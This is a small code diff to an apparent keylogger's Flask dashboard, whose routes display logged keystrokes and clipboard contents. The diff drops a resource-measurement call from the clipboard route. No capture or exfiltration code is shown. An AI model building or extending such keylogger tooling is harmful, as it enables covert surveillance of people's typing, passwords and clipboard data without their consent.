@@ -128,7 +128,6 @@ def logged_keystrokes():
 # Route to display clipboard content
 @app.route('/clipboard_content')
 def clipboard_content():
-    keylogger.measure_resource_utilization()
     clipboard_content = keylogger.get_clipboard_content()
     return render_template('clipboard.html', title='Clipboard Content', clipboard_content=clipboard_content)
 
